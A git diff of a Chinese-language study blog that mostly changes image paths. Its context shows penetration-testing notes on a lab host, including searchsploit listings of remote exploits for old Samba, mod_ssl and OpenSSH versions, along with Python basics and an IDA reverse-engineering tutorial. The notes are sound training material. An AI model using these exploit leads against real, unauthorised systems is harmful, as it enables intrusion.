 <ul>
 <li>File extension 可以根據伺服器情況進行修改</li>
 <li>常見網頁伺服器會出現的檔案類型</li>
@@ -669,33 +902,33 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
 </ol>
 <ul>
 <li><p>可以在此處查看找到的目錄下的檔案</p>
-<p>  <img src="img/scann_Untitled_6.png" alt="Untitled"></p>
+<p>  <img src="/img/scann_Untitled_6.png" alt="Untitled"></p>
 <ul>
 <li><p>看到Response Code</p>
 <ul>
 <li>200/403/300/500…</li>
 <li><p>開啟查看有趣的頁面發現敏感訊息</p>
-<p>  <img src="img/scann_Untitled_7.png" alt="Untitled"></p>
+<p>  <img src="/img/scann_Untitled_7.png" alt="Untitled"></p>
 </li>
 <li><p>查看網頁內容 &gt; 紀錄有用的資訊</p>
-<p><img src="img/scann_Untitled_8.png" alt="Untitled"></p>
+<p><img src="/img/scann_Untitled_8.png" alt="Untitled"></p>
 </li>
 </ul>
 </li>
 </ul>
 </li>
 <li><p>通過查看網頁源碼，可能可以發現一些敏感訊息在其中</p>
-<p>  <img src="img/scann_Untitled_9.png" alt="Untitled"></p>
+<p>  <img src="/img/scann_Untitled_9.png" alt="Untitled"></p>
 </li>
 <li><p>Repeater 可以即時回應送出的請求，或是修改發送內容</p>
-<p>  <img src="img/scann_Untitled_10.png" alt="Untitled"></p>
+<p>  <img src="/img/scann_Untitled_10.png" alt="Untitled"></p>
 </li>
 <li><p>限制搜索範圍</p>
-<p>  <img src="img/scann_Untitled_11.png" alt="Untitled"></p>
+<p>  <img src="/img/scann_Untitled_11.png" alt="Untitled"></p>
 </li>
 <li><p>訊息披露</p>
   <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br></pre></td></tr></table></figure>
-<p>  <img src="img/scann_Untitled_12.png" alt="Untitled"></p>
+<p>  <img src="/img/scann_Untitled_12.png" alt="Untitled"></p>
 </li>
 <li><p>紀錄並整理有用資訊</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">80/443-192.168.19.140·13:52pm</span><br><span class="line">Default webpage Apache PHP</span><br><span class="line">+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line"></span><br><span class="line">Information Disclosure </span><br><span class="line"></span><br><span class="line">http://192.168.19.140/usage/usage_202402.html - Webalizer Version 2.01</span><br><span class="line"></span><br><span class="line">vuln:</span><br><span class="line">+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow <span class="built_in">which</span> may allow a remote shell.</span><br></pre></td></tr></table></figure>
@@ -786,7 +1019,7 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
 <li><p>searchsploit 去搜索特定版本可利用的腳本</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **searchsploit Samba**                                                                                       </span><br><span class="line">----------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                               |  Path</span><br><span class="line">----------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">....</span><br><span class="line">Samba 2.2.2 &lt; 2.2.6 - <span class="string">&#x27;nttrans&#x27;</span> Remote Buffer Overflow (Metasploit) (1)      | linux/remote/16321.rb</span><br><span class="line">Samba 2.2.8 (BSD x86) - <span class="string">&#x27;trans2open&#x27;</span> Remote Overflow (Metasploit)            | bsd_x86/remote/16880.rb</span><br><span class="line">Samba 2.2.8 (Linux Kernel 2.6 / Debian / Mandrake) - Share Privilege Escalat | linux/local/23674.txt</span><br><span class="line">Samba 2.2.8 (Linux x86) - <span class="string">&#x27;trans2open&#x27;</span> Remote Overflow (Metasploit)          | linux_x86/remote/16861.rb</span><br><span class="line">Samba 2.2.8 (OSX/PPC) - <span class="string">&#x27;trans2open&#x27;</span> Remote Overflow (Metasploit)            | osx_ppc/remote/16876.rb</span><br><span class="line">Samba 2.2.8 (Solaris SPARC) - <span class="string">&#x27;trans2open&#x27;</span> Remote Overflow (Metasploit)      | solaris_sparc/remote/16330.rb</span><br><span class="line">Samba 2.2.8 - Brute Force Method Remote Command Execution                    | linux/remote/55.c</span><br><span class="line">Samba 2.2.x - <span class="string">&#x27;call_trans2open&#x27;</span> Remote Buffer Overflow (1)                   | unix/remote/22468.c</span><br><span class="line">Samba 2.2.x - <span class="string">&#x27;call_trans2open&#x27;</span> Remote Buffer Overflow (2)                   | unix/remote/22469.c</span><br><span class="line">Samba 2.2.x - <span class="string">&#x27;call_trans2open&#x27;</span> Remote Buffer Overflow (3)                   | unix/remote/22470.c</span><br><span class="line">Samba 2.2.x - <span class="string">&#x27;call_trans2open&#x27;</span> Remote Buffer Overflow (4)                   | unix/remote/22471.txt</span><br><span class="line">Samba 2.2.x - <span class="string">&#x27;nttrans&#x27;</span> Remote Overflow (Metasploit)                         | linux/remote/9936.rb</span><br><span class="line">...</span><br><span class="line">Samba 3.5.0 - Remote Code Execution                                          | linux/remote/42060.py</span><br><span class="line">Samba 3.5.0 &lt; 4.4.14/4.5.10/4.6.4 - <span class="string">&#x27;is_known_pipename()&#x27;</span> Arbitrary Module L | linux/remote/42084.rb</span><br><span class="line">Samba 3.5.11/3.6.3 - Remote Code Execution                                   | linux/remote/37834.py</span><br><span class="line">Samba 3.5.22/3.6.17/4.0.8 - nttrans Reply Integer Overflow                   | linux/dos/27778.txt</span><br><span class="line">Samba 4.5.2 - Symlink Race Permits Opening Files Outside Share Directory     | multiple/remote/41740.txt</span><br><span class="line">Samba &lt; 2.0.5 - Local Overflow                                               | linux/local/19428.c</span><br><span class="line">Samba &lt; 2.2.8 (Linux/BSD) - Remote Code Execution                            | multiple/remote/10.c</span><br><span class="line">...</span><br><span class="line">Sambar Server 6.1 Beta 2 - <span class="string">&#x27;showini.asp&#x27;</span> Arbitrary File Access               | windows/remote/24163.txt</span><br><span class="line">Sambar Server 6.1 Beta 2 - <span class="string">&#x27;showperf.asp?title&#x27;</span> Cross-Site Scripting         | windows/remote/24162.txt</span><br><span class="line">SWAT Samba Web Administration Tool - Cross-Site Request Forgery              | cgi/webapps/17577.txt</span><br><span class="line">----------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line">                                                                                                               </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **searchsploit mod ssl 2**                                                                                   </span><br><span class="line">----------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                               |  Path</span><br><span class="line">----------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Apache 2.0.58 mod_rewrite (Windows 2003) - Remote Overflow                   | windows/remote/3996.c</span><br><span class="line">Apache &lt; 1.3.37/2.0.59/2.2.3 mod_rewrite - Remote Overflow                   | multiple/remote/2237.sh</span><br><span class="line">Apache mod_rewrite (Windows x86) - Off-by-One Remote Overflow                | windows_x86/remote/3680.sh</span><br><span class="line">....</span><br><span class="line">Apache mod_ssl &lt; 2.8.7 OpenSSL - <span class="string">&#x27;OpenFuck.c&#x27;</span> Remote Buffer Overflow         | unix/remote/21671.c</span><br><span class="line">Apache mod_ssl &lt; 2.8.7 OpenSSL - <span class="string">&#x27;OpenFuckV2.c&#x27;</span> Remote Buffer Overflow (1)   | unix/remote/764.c</span><br><span class="line">Apache mod_ssl &lt; 2.8.7 OpenSSL - <span class="string">&#x27;OpenFuckV2.c&#x27;</span> Remote Buffer Overflow (2)   | unix/remote/47080.c</span><br><span class="line">....</span><br><span class="line">Modbus Slave 7.0.0 - Denial of Service (PoC)                                 | windows/dos/45732.txt</span><br><span class="line">Modbus Slave 7.3.1 - Buffer Overflow (DoS)                                   | windows/dos/50536.py</span><br><span class="line">Modbus Slave PLC 7 - <span class="string">&#x27;.msw&#x27;</span> Buffer Overflow (PoC)                            | windows_x86/local/45710.pl</span><br><span class="line">Veritas/Symantec Backup Exec - SSL NDMP Connection Use-After-Free (Metasploi | windows/remote/42282.rb</span><br><span class="line">----------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **searchsploit OpenSSH 2.9p2**</span><br><span class="line">----------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                               |  Path</span><br><span class="line">----------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">OpenSSH 2.3 &lt; 7.7 - Username Enumeration                                     | linux/remote/45233.py</span><br><span class="line">OpenSSH 2.3 &lt; 7.7 - Username Enumeration (PoC)                               | linux/remote/45210.py</span><br><span class="line">OpenSSH &lt; 6.6 SFTP (x64) - Command Execution                                 | linux_x86-64/remote/45000.c</span><br><span class="line">OpenSSH &lt; 6.6 SFTP - Command Execution                                       | linux/remote/45001.py</span><br><span class="line">OpenSSH &lt; 7.4 - <span class="string">&#x27;UsePrivilegeSeparation Disabled&#x27;</span> Forwarded Unix Domain Sock | linux/local/40962.txt</span><br><span class="line">OpenSSH &lt; 7.4 - agent Protocol Arbitrary Library Loading                     | linux/remote/40963.txt</span><br><span class="line">OpenSSH &lt; 7.7 - User Enumeration (2)                                         | linux/remote/45939.py</span><br><span class="line">----------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure>
 <h3 id="Our-Notes-So-Far"><a href="#Our-Notes-So-Far" class="headerlink" title="Our Notes So Far"></a><strong>Our Notes So Far</strong></h3><p>做個筆記紀錄所找到的資訊</p>
-<p><img src="img/scann_Untitled_13.png" alt="Untitled"></p>
+<p><img src="/img/scann_Untitled_13.png" alt="Untitled"></p>
 </li>
 </ul>
 </li>
@@ -1411,7 +1644,7 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
 </li>
 </ul>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#this is a function without parameter</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">whoami</span>():</span><br><span class="line">    name = <span class="string">&quot;heath&quot;</span> <span class="comment"># local variable</span></span><br><span class="line">    age = <span class="number">30</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;my name is &quot;</span> + name + <span class="string">&quot; and I am &quot;</span> + <span class="built_in">str</span>(age) + <span class="string">&quot; years old&quot;</span>)<span class="comment">#my name is Heath and I am 33 years old</span></span><br><span class="line">    <span class="comment">#my name is heath and I am 30 years old</span></span><br><span class="line"></span><br><span class="line">whoami()</span><br><span class="line"><span class="comment">#print(age)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">print(age)</span></span><br><span class="line"><span class="string">          ^^^</span></span><br><span class="line"><span class="string">NameError: name &#x27;age&#x27; is not defined</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addonehundured</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="built_in">print</span>(num+<span class="number">100</span>)<span class="comment">#200</span></span><br><span class="line"></span><br><span class="line">addonehundured(<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="built_in">print</span>(x+y)<span class="comment">#14</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>,<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mutiply</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="keyword">return</span> x*y</span><br><span class="line"></span><br><span class="line">mutiply(<span class="number">7</span>,<span class="number">7</span>)</span><br><span class="line"><span class="built_in">print</span>(mutiply(<span class="number">7</span>,<span class="number">7</span>))<span class="comment">#49</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">seqroot</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="built_in">print</span>(x ** <span class="number">.5</span>)<span class="comment">#8.0</span></span><br><span class="line"></span><br><span class="line">seqroot(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#new line</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nl</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">nl()</span><br></pre></td></tr></table></figure>
-<h3 id="Boolean-Expressions-and-Relational-Operators"><a href="#Boolean-Expressions-and-Relational-Operators" class="headerlink" title="Boolean Expressions and Relational Operators"></a><strong>Boolean Expressions and Relational Operators</strong></h3><p><img src="img/Py_Untitled.png" alt="Untitled"></p>
+<h3 id="Boolean-Expressions-and-Relational-Operators"><a href="#Boolean-Expressions-and-Relational-Operators" class="headerlink" title="Boolean Expressions and Relational Operators"></a><strong>Boolean Expressions and Relational Operators</strong></h3><p><img src="/img/Py_Untitled.png" alt="Untitled"></p>
 <ul>
 <li>boolean expressions<ul>
 <li>計算結果為 True 或 False</li>
@@ -1967,10 +2200,10 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
 <p><a target="_blank" rel="noopener" href="https://hackmd.io/@yp6CBnh0Qg-d0nsWrmIGZw/ryf4glefs/https%3A%2F%2Fhackmd.io%2F%40yp6CBnh0Qg-d0nsWrmIGZw%2Fr1cOVyezi">https://hackmd.io/@yp6CBnh0Qg-d0nsWrmIGZw/ryf4glefs/https%3A%2F%2Fhackmd.io%2F%40yp6CBnh0Qg-d0nsWrmIGZw%2Fr1cOVyezi</a></p>
 <p>反編譯: 分析已有的二進制文件，推倒原始設計跟實現的過程</p>
 <p>用於: 保護知識產權、解析文件跟恢復數據</p>
-<p><img src="img/rev_Untitled.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled.png" alt="Untitled"></p>
 <p>編譯: 元碼轉換電腦能執行的程式</p>
 <p>組譯：將組合語言轉換成可執行的檔案。</p>
-<p><img src="img/rev_Untitled_1.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_1.png" alt="Untitled"></p>
 <p>動態分析</p>
 <ul>
 <li>在程式執行期間一邊分析程式當下運行狀況</li>
@@ -2103,11 +2336,11 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
 <p>docker run —rm -it -p 80:80 image bash</p>
 <p>docker run —rm -it -v .:dir image bash</p>
 <h3 id="實作"><a href="#實作" class="headerlink" title="實作"></a>實作</h3><p>在主機建立一個資料夾，方便與虛擬機傳輸檔案</p>
-<p><img src="img/rev_Untitled_2.png" alt="Untitled"></p>
-<p><img src="img/rev_Untitled_3.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_2.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_3.png" alt="Untitled"></p>
 <p>打開虛擬機會看到linux的media目錄下有個sf_…，剛開始會沒有訪問權限</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">remnux@remnux:/media$ <span class="built_in">sudo</span> adduser <span class="variable">$USER</span> vboxsf</span><br><span class="line"><span class="comment">#新增此命令將目前使用者新增到vboxsf群組，以便當前用戶可以存取共享資料夾</span></span><br></pre></td></tr></table></figure>
-<p><img src="img/rev_Untitled_4.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_4.png" alt="Untitled"></p>
 <hr>
 <p> 當執行了reverseinghereo會看到它生成了一個目錄及兩個檔案</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">remnux@remnux:~/Downloads$ <span class="built_in">chmod</span> +x reversinghero</span><br><span class="line">remnux@remnux:~/Downloads$ ./reversinghero </span><br><span class="line">@ 1/p1</span><br><span class="line">@ 1/x1</span><br><span class="line">] +</span><br><span class="line">remnux@remnux:~/Downloads$ <span class="built_in">ls</span></span><br><span class="line">1  reversinghero</span><br><span class="line">remnux@remnux:~/Downloads$ <span class="built_in">cd</span> 1</span><br><span class="line">remnux@remnux:~/Downloads/1$ <span class="built_in">ls</span></span><br><span class="line">p1  x1 </span><br><span class="line">remnux@remnux:~/Downloads/1$ <span class="built_in">chmod</span> +x p1 </span><br><span class="line">remnux@remnux:~/Downloads/1$ <span class="built_in">chmod</span> +x p1 x1</span><br><span class="line">remnux@remnux:~/Downloads/1$ ./p1</span><br><span class="line">&gt; 1</span><br><span class="line">] -</span><br><span class="line">remnux@remnux:~/Downloads/1$ ./x1</span><br><span class="line">? ww</span><br><span class="line">! -</span><br><span class="line">remnux@remnux:~/idafree-8.3$ ./ida64  &amp;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -2116,32 +2349,32 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
 <li>圖形視圖</li>
 <li>了解控制項流程</li>
 </ul>
-<p><img src="img/rev_Untitled_5.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_5.png" alt="Untitled"></p>
 <p>按空白鍵切換線性視圖，在按一次空白鍵可以切回圖形視圖</p>
 <p>往下滾動，地址增加</p>
-<p><img src="img/rev_Untitled_6.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_6.png" alt="Untitled"></p>
 <ul>
 <li>載入部分</li>
 <li>資料結構、擁有的字串</li>
 </ul>
-<p><img src="img/rev_Untitled_7.png" alt="Untitled"></p>
-<p><img src="img/rev_Untitled_8.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_7.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_8.png" alt="Untitled"></p>
 <ul>
 <li>BSS</li>
 <li>未初始化資料部分</li>
 </ul>
-<p><img src="img/rev_Untitled_9.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_9.png" alt="Untitled"></p>
 <ul>
 <li>外部部分</li>
 <li>為系統提供外部功能</li>
 </ul>
-<p><img src="img/rev_Untitled_10.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_10.png" alt="Untitled"></p>
 <p>如果遇到警告，表示不再函數中，要回到函數中，最快的做法是點擊上方藍色區域，或是左側function name</p>
 <p>藍色區塊主要是函數、程式、程式碼</p>
 <p>灰色是數據</p>
-<p><img src="img/rev_Untitled_11.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_11.png" alt="Untitled"></p>
 <p>點擊左側_start回到函數起點</p>
-<p><img src="img/rev_Untitled_12.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_12.png" alt="Untitled"></p>
 <ul>
 <li>綠色箭頭<ul>
 <li>測試為True時他將發生因此轉到指定部分</li>
@@ -2159,21 +2392,21 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
 <p>想放大縮小，按住Control，並捲動視圖</p>
 <p>如果按鍵盤上的1會返回正常縮放，也就是100%</p>
 <p>有看到上面一條條的小間隙，代表那區段是======XXX=====</p>
-<p><img src="img/rev_Untitled_13.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_13.png" alt="Untitled"></p>
 <p>想查看字節 &gt; Options&gt;General</p>
 <p>修改成6 or 8，將顯示8位元組</p>
-<p><img src="img/rev_Untitled_14.png" alt="Untitled"></p>
-<p><img src="img/rev_Untitled_15.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_14.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_15.png" alt="Untitled"></p>
 <p>如果看到位元組顯示了一個+號或…代表指令佔用了超過8個位元組</p>
 <p>每條指令位元組並不相同</p>
 <p>除了在線性視圖中可以顯示字節</p>
 <p>圖形視圖也是通過同樣的方式修改，記得切換到圖形視圖的介面</p>
-<p><img src="img/rev_Untitled_16.png" alt="Untitled"></p>
-<p><img src="img/rev_Untitled_17.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_16.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_17.png" alt="Untitled"></p>
 <h3 id="功能之間導航"><a href="#功能之間導航" class="headerlink" title="功能之間導航"></a>功能之間導航</h3><p>假設是入口點開始_start</p>
 <p>透過雙擊函數printf進入函數查看該功能，或按Control + enter</p>
-<p><img src="img/rev_Untitled_18.png" alt="Untitled"></p>
-<p><img src="img/rev_Untitled_19.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_18.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_19.png" alt="Untitled"></p>
 <p>要返回先前位置按esc，如果在IDA中忘記先前所在的位置，按esc直到回到要的地方</p>
 <p>轉換數字的進制</p>
 <ul>
@@ -2181,9 +2414,9 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
 <li>按h會轉換成10進制</li>
 <li>按b會轉換成2進制</li>
 </ul>
-<p><img src="img/rev_Untitled_20.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_20.png" alt="Untitled"></p>
 <p>查看函數在哪些地方被呼叫，對目標函數按X</p>
-<p><img src="img/rev_Untitled_21.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_21.png" alt="Untitled"></p>
 <p>重新命名標籤和函數</p>
 <ul>
 <li>知道該函數作用就能重新命名</li>
@@ -2191,45 +2424,45 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
 <li>知道自己已經分析過這函數</li>
 </ul>
 <p>右鍵點擊函數命名，快捷鍵按N</p>
-<p><img src="img/rev_Untitled_22.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_22.png" alt="Untitled"></p>
 <p>如果想恢復預設名稱，回到重新命名的畫面，並刪除名稱框中的字</p>
 <h3 id="註解"><a href="#註解" class="headerlink" title="註解"></a>註解</h3><p>在某行上方插入註解</p>
 <p>fn+insert</p>
-<p><img src="img/rev_Untitled_23.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_23.png" alt="Untitled"></p>
 <p>在該行註解內容直接輸入 ;</p>
 <p>某行下方新增註解或指令，fn+shift+insert</p>
 <p>; 是為了跟指令區分開</p>
 <h3 id="搜尋"><a href="#搜尋" class="headerlink" title="搜尋"></a>搜尋</h3><p>找位元組序列，按alt+B貼上想要搜尋的字節</p>
 <p>右鍵先複製要搜尋的字節，比如這邊複製<strong>4B BE</strong> &gt; Search &gt; Sequence of Bytes</p>
-<p><img src="img/rev_Untitled_24.png" alt="Untitled"></p>
-<p><img src="img/rev_Untitled_25.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_24.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_25.png" alt="Untitled"></p>
 <p>他會列出所有找到48 BE的位置</p>
-<p><img src="img/rev_Untitled_26.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_26.png" alt="Untitled"></p>
 <p>同樣能利用Sequence of Bytes 進入後搜尋特定字串</p>
-<p><img src="img/rev_Untitled_27.png" alt="Untitled"></p>
-<p><img src="img/rev_Untitled_28.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_27.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_28.png" alt="Untitled"></p>
 <p>搜尋參數、指令</p>
 <ul>
 <li>複製目標指令</li>
 <li>記得加0x接指令，比如這邊是0x0A，16進制的意思</li>
 </ul>
-<p><img src="img/rev_Untitled_29.png" alt="Untitled"></p>
-<p><img src="img/rev_Untitled_30.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_29.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_30.png" alt="Untitled"></p>
 <p>字串搜尋</p>
 <ul>
 <li>文件越大搜索速度越慢</li>
 <li>搜尋整個線性視圖中所有的字串、內容</li>
 </ul>
-<p><img src="img/rev_Untitled_31.png" alt="Untitled"></p>
-<p><img src="img/rev_Untitled_32.png" alt="Untitled"></p>
-<p><img src="img/rev_Untitled_33.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_31.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_32.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_33.png" alt="Untitled"></p>
 <p>字串或文字搜尋評論</p>
 <ul>
 <li>選擇function，切換到線性視圖</li>
 <li>Alt+T搜索</li>
 </ul>
-<p><img src="img/rev_Untitled_34.png" alt="Untitled"></p>
-<p><img src="img/rev_Untitled_35.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_34.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_35.png" alt="Untitled"></p>
 <h3 id="數據探索"><a href="#數據探索" class="headerlink" title="數據探索"></a>數據探索</h3><ul>
 <li>程式碼或資料轉換為程式碼</li>
 <li>程式碼轉換為資料</li>
@@ -2244,8 +2477,8 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
 <ul>
 <li>按Edit &gt; Undefine</li>
 </ul>
-<p><img src="img/rev_Untitled_36.png" alt="Untitled"></p>
-<p><img src="img/rev_Untitled_37.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_36.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_37.png" alt="Untitled"></p>
 <p>可以將字串組合成一個字</p>
 <ul>
 <li>word (2 bytes)</li>
@@ -2257,22 +2490,22 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
 <ul>
 <li>如果返回圖表視圖，會發現顯示上的錯誤</li>
 </ul>
-<p><img src="img/rev_Untitled_38.png" alt="Untitled"></p>
-<p><img src="img/rev_Untitled_39.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_38.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_39.png" alt="Untitled"></p>
 <p>現在指令是未定義的，返回原始資料位元組</p>
-<p><img src="img/rev_Untitled_40.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_40.png" alt="Untitled"></p>
 <p>P = Make function<br>C = Convert to Code</p>
 <h3 id="嘗試修復"><a href="#嘗試修復" class="headerlink" title="嘗試修復"></a>嘗試修復</h3><p>選擇剛剛被取消定義的地方，按c，但仍然能看到錯誤</p>
-<p><img src="img/rev_Untitled_41.png" alt="Untitled"></p>
-<p><img src="img/rev_Untitled_42.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_41.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_42.png" alt="Untitled"></p>
 <p>為了修復錯誤，需要取消整個函數的定義</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**sub_400728**      proc near               ; CODE XREF: _start+46↑p</span><br><span class="line">.text:0000000000400728                 push    r12</span><br><span class="line">.text:000000000040072A                 push    r13</span><br><span class="line">.text:000000000040072C                 push    r13</span><br><span class="line">.text:000000000040072E                 <span class="built_in">test</span>    rsi, rsi</span><br><span class="line">.text:0000000000400731                 jz      short loc_400764</span><br><span class="line">.text:0000000000400733                 mov     r12, rdi</span><br><span class="line">.text:0000000000400736                 mov     r13, rdx</span><br><span class="line">.text:0000000000400739                 call    _fgets</span><br><span class="line">.text:000000000040073E                 <span class="built_in">test</span>    rax, rax</span><br><span class="line">.text:0000000000400741                 jz      short loc_400761</span><br><span class="line">.text:0000000000400743                 mov     rdi, r12        ; s</span><br><span class="line">.text:0000000000400746                 mov     rsi, offset reject ; <span class="string">&quot;\n&quot;</span></span><br><span class="line">.text:0000000000400750                 call    _strcspn</span><br><span class="line">.text:0000000000400755                 xor     edx, edx</span><br><span class="line">.text:0000000000400757                 xchg    dl, [r12+rax]</span><br><span class="line">.text:000000000040075B                 cmp     rdx, 0Ah</span><br><span class="line">.text:000000000040075F                 jz      short loc_400764</span><br><span class="line">.text:0000000000400761</span><br><span class="line">.text:0000000000400761 loc_400761:                             ; CODE XREF: sub_400728+19↑j</span><br><span class="line">.text:0000000000400761                 xor     r12, r12</span><br><span class="line">.text:0000000000400764</span><br><span class="line">.text:0000000000400764 loc_400764:                             ; CODE XREF: sub_400728+9↑j</span><br><span class="line">.text:0000000000400764                                         ; sub_400728+37↑j</span><br><span class="line">.text:0000000000400764                 mov     rax, r12</span><br><span class="line">.text:0000000000400767                 pop     r13</span><br><span class="line">.text:0000000000400769                 pop     r13</span><br><span class="line">.text:000000000040076B                 pop     r12</span><br><span class="line">.text:000000000040076D                 retn</span><br><span class="line">.text:000000000040076D sub_400728      endp ; sp-analysis failed</span><br><span class="line">.text:000000000040076D</span><br><span class="line">.text:000000000040076D _text           **ends**</span><br></pre></td></tr></table></figure>
-<p><img src="img/rev_Untitled_43.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_43.png" alt="Untitled"></p>
 <p>選取完後按 <code>u</code> 取消內容的定義</p>
 <p>接下來對函數起始按 <code>p</code> 操作進行修復</p>
 <p>按回圖形視圖沒有錯誤就代表修復成功</p>
-<p><img src="img/rev_Untitled_44.png" alt="Untitled"></p>
-<p><img src="img/rev_Untitled_45.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_44.png" alt="Untitled"></p>
+<p><img src="/img/rev_Untitled_45.png" alt="Untitled"></p>
 <ul>
 <li>將資料的任何部分變更為程式碼，也可以將程式碼的任何部分變更為資料</li>
 <li>可以修改資料型別等</li>
@@ -2281,17 +2514,17 @@ tcp.flags.reset==1))</code><br><img src="https://i.imgur.com/oj94ZLN.png" alt=""
 <h3 id="開啟另一個反彙編窗口"><a href="#開啟另一個反彙編窗口" class="headerlink" title="開啟另一個反彙編窗口"></a>開啟另一個反彙編窗口</h3><p>View &gt; Open subviews &gt; Disassembly</p>
 <p>如果需要同時查看程式碼的兩個不同部分，可以這樣做</p>
 <p>快捷鍵是 alt +2 /alt +3，快速切換兩個畫面</p>
-<p><img src="img/rev_Untitled_46.png" alt="Untitled"></p>
